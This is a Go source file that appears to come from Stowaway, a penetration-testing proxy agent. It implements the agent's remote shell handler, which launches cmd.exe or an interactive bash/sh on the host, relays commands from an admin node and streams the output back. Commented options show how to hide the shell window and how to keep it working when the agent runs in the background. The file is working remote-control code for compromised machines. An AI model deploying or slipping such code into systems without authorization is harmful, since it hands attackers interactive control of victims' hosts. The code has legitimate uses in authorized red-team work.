package handler

import (
	"io"
	"os/exec"
	"runtime"

	"Stowaway/agent/initial"
	"Stowaway/agent/manager"
	"Stowaway/global"
	"Stowaway/protocol"
	"Stowaway/utils"
)

type Shell struct {
	stdin   io.Writer
	stdout  io.Reader
	charset string
}

func newShell(options *initial.Options) *Shell {
	shell := new(Shell)
	shell.charset = options.Charset
	return shell
}

func (shell *Shell) start() {
	var cmd *exec.Cmd
	var err error

	sMessage := protocol.NewUpMsg(global.G_Component.Conn, global.G_Component.Secret, global.G_Component.UUID)

	shellResHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.SHELLRES,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	shellResultHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.SHELLRESULT,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	shellResFailMess := &protocol.ShellRes{
		OK: 0,
	}

	shellResSuccMess := &protocol.ShellRes{
		OK: 1,
	}

	defer func() {
		if err != nil {
			protocol.ConstructMessage(sMessage, shellResHeader, shellResFailMess, false)
			sMessage.SendMessage()
		}
	}()

	switch utils.CheckSystem() {
	case 0x01:
		cmd = exec.Command("c:\\windows\\system32\\cmd.exe")
		// cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // If you don't want the cmd window, remove "//"
	default:
		cmd = exec.Command("/bin/sh", "-i")
		if runtime.GOARCH == "386" || runtime.GOARCH == "amd64" {
			cmd = exec.Command("/bin/bash", "-i")
		}
		// If you want to start agent with "&" and you also want to use command "shell",plz recompile a brand new agent by removing "//" in the front of line 70&&71
		// cmd.SysProcAttr = &syscall.SysProcAttr{Foreground: true}
		// signal.Ignore(syscall.SIGTTIN, syscall.SIGTTOU)
	}

	shell.stdout, err = cmd.StdoutPipe()
	if err != nil {
		return
	}

	shell.stdin, err = cmd.StdinPipe()
	if err != nil {
		return
	}

	cmd.Stderr = cmd.Stdout //将stderr重定向至stdout

	err = cmd.Start()
	if err != nil {
		return
	}

	protocol.ConstructMessage(sMessage, shellResHeader, shellResSuccMess, false)
	sMessage.SendMessage()

	shellExitHeader := &protocol.Header{
		Sender:      global.G_Component.UUID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.SHELLEXIT,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	shellExitMess := &protocol.ShellExit{
		OK: 1,
	}

	buffer := make([]byte, 4096)
	for {
		count, err := shell.stdout.Read(buffer)

		if err != nil {
			protocol.ConstructMessage(sMessage, shellExitHeader, shellExitMess, false)
			sMessage.SendMessage()
			return
		}

		result := string(buffer[:count])
		if shell.charset == "gbk" { // Fix shell output bug when agent is running on Windows,thanks to @lz520520
			result = utils.ConvertGBK2Str(result)
			count = len(result)
		}

		shellResultMess := &protocol.ShellResult{
			ResultLen: uint64(count),
			Result:    result,
		}

		protocol.ConstructMessage(sMessage, shellResultHeader, shellResultMess, false)
		sMessage.SendMessage()
	}
}

func (shell *Shell) input(command string) {
	if shell.charset == "gbk" {
		command = utils.ConvertStr2GBK(command)
	}

	shell.stdin.Write([]byte(command))
}

func DispatchShellMess(mgr *manager.Manager, options *initial.Options) {
	var shell *Shell

	for {
		message := <-mgr.ShellManager.ShellMessChan

		switch mess := message.(type) {
		case *protocol.ShellReq:
			shell = newShell(options)
			go shell.start()
		case *protocol.ShellCommand:
			shell.input(mess.Command)
		}
	}
}
